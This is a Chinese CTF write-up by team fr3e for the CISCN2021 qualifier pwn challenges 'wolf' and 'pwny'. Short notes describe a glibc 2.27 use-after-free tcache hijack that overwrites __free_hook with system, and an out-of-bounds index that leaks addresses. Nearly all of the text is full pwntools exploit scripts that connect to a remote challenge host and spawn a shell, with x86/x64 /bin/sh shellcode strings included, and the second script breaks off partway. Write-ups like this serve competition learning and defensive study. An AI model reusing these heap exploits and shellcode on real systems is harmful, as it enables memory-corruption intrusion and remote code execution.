# CISCN2021 初赛wp by fr3e
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
大家好，我们是fr3e战队，上周打了国赛，最后排名26（华中4），各大高校的各位大师傅们tql。下面是fr3e的wp，希望和各位大师傅们交流。仓促整理，有错误直接issue，dalao们轻喷
：p
## pwn
###  wolf
UAF 2.27 打tcache的管理结构
之后打hook
    # _*_ coding:utf-8 _*_
    from pwn import *
    context.log_level = 'debug'
    context.terminal=['tmux', 'splitw', '-h']
    prog = './lonelywolf'
    #elf = ELF(prog)
    # p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
    libc = ELF("./libc-2.27.so")
    p = remote("124.71.227.203", 26116)
    def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
        else:
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
    def dbg():
        gdb.attach(p)
    #-----------------------------------------------------------------------------------------    s = lambda data :p.send(str(data))#in case that data is an int
    sa= lambda delim,data :p.sendafter(str(delim), str(data)) 
    sl= lambda data :p.sendline(str(data)) 
    sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) 
    r = lambda numb=4096:p.recv(numb)
    ru= lambda delims, drop=True  :p.recvuntil(delims, drop)
    it= lambda:p.interactive()
    uu32= lambda data   :u32(data.ljust(4, '\0'))
    uu64= lambda data   :u64(data.ljust(8, '\0'))
    bp= lambda bkp:pdbg.bp(bkp)
    li= lambda str1,data1 :log.success(str1+'========>'+hex(data1))
    def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")
    def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    
    choice="Your choice: "
    def add(size,c='a'):  #
    ru(choice)
    sl('1')
    ru("Index: ")
    sl('0')
    ru("Size: ")
    sl(str(size))
    def delete():
    ru(choice)
    sl('4')
    ru("Index: ")
    sl('0')
    def edit(c):
    ru(choice)
    sl('2')
    ru("Index: ")
    sl('0')
    ru("Content: " )  
    sl(c)  
    def show():
    ru(choice)
    sl('3')
    ru("Index: ")
    sl('0')
    ru("Content: ")
    def exp():
        add(0x78)
        delete()
        # delete()
        edit('wi1laaaaa')
        delete()
        show()
        # ru("Content: ")
        data = uu64(r(6))
        heap = data - 0x260
        lg('heap',heap)
        #-----------------------------        edit(p64(heap+0x10))
        add(0x78)
        add(0x78)
        edit('\x07'*0x40)
        delete()
        show()
        data  = uu64(ru('\x7f',drop=False)[-6:])
        lg('data',data)
        addr = data -0x3ebca0
        free_hook=addr+libc.sym['__free_hook']
        sys_addr=addr+libc.sym['system']
        lg('addr',addr)
        edit('\x01'*0x40+p64(free_hook-8))
        add(0x10)
        edit('/bin/sh\x00'+p64(sys_addr))
        delete()
        # dbg()
        it()
    if __name__ == '__main__':
        exp()
###  pwny
两次write(0x200)
可以泄露bss地址同时造成任意地址写
    # _*_ coding:utf-8 _*_
    from pwn import *
    context.log_level = 'debug'
    context.terminal=['tmux', 'splitw', '-h']
    prog = './pwny'
    #elf = ELF(prog)
    # p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    p = remote("124.71.227.203", 26219)
    def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
        else:
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
    def dbg():
        gdb.attach(p)
    #-----------------------------------------------------------------------------------------    s = lambda data :p.send(str(data))#in case that data is an int
    sa= lambda delim,data :p.sendafter(str(delim), str(data)) 
    sl= lambda data :p.sendline(str(data)) 
    sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) 
    r = lambda numb=4096:p.recv(numb)
    ru= lambda delims, drop=True  :p.recvuntil(delims, drop)
    it= lambda:p.interactive()
    uu32= lambda data   :u32(data.ljust(4, '\0'))
    uu64= lambda data   :u64(data.ljust(8, '\0'))
    bp= lambda bkp:pdbg.bp(bkp)
    li= lambda str1,data1 :log.success(str1+'========>'+hex(data1))
    def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")
    def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    
    def a_read(idx,con='\n'):
    sla("Your choice: ",'1')
    sla("Index: ",str(idx))
    sla('Content:',con)
    def a_write(idx):
    sla("Your choice: ",'2')
    sla("Index: ",str(idx))
    def exp():
        a_write(0)
        a_write(0x100)
        # a_read(1)
        a_write(0x100)
        # s(1)
        # a_read(str(0xfffffffc)
        sla("Your choice: ",'1')
        sa("Index: ",p64(0xffffffffffffffe0/8))
        # a_write(2)
        ru("Result: ")
        data = int(r(12),16)
        lg('data',data)
        addr = data - 0x7f7d41c07680 + 0x7f7d4181b000
        lg('addr',addr)
        sla("Your choice: ",'1')
        sa("Index: ",p64(0xffffffffffffffa8/8))